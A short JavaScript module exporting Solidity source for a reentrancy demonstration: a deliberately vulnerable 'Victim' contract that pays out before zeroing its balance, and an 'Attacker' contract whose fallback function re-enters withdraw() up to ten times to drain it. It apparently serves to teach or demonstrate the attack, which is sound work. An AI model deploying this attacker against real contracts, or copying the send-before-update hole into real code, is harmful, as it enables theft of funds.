export default `pragma solidity ^0.4.8;

contract Victim {
  uint public withdrawableBalance = 2 ether;

  function withdraw() {
    if (!msg.sender.call.value(withdrawableBalance)()) throw;
    withdrawableBalance = 0;
  }

  function deposit() payable {}
}

contract Attacker {
  Victim v;
  uint public count;

  event LogFallback(uint c, uint balance);

  function Attacker(address victim) {
    v = Victim(victim);
  }

  function attack() {
    v.withdraw();
  }

  function () payable {
    count++;
    LogFallback(count, this.balance);
    if (count < 10) {
      v.withdraw();
    } 
  }
}
`